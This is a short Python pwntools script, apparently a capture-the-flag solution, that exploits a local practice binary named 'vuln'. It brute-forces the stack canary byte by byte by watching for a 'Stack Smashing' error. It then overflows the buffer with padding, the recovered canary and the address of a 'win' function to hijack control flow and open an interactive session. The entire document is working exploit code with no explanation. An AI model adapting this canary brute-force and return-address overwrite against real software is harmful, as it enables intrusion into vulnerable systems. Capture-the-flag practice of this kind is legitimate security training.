from pwn import *

elf = ELF("./vuln")
canary = ""

for i in range(4):
	for a in range(256):
		canary_temp = canary + chr(a)
		p = process("./vuln")
		p.sendlineafter("How Many Bytes will You Write Into the Buffer?\n> " , str(0x100))
		payload = "a" * 0x20 + canary_temp
		p.sendafter("Input> " , payload)
		result = p.recvline()
		log.info(result)
		p.close()
		if "Stack Smashing" not in result:
			canary += chr(a)
			log.success("canary found :" + canary)
			pause()
			break

log.success("canary found :" + canary)
p = process("./vuln")
p.sendlineafter("How Many Bytes will You Write Into the Buffer?\n> " , str(0x100))
payload = "a" * 0x20 + canary + "b" * (0xc + 0x4) +  p32(elf.sym["win"])
p.sendlineafter("Input> " , payload)
p.interactive()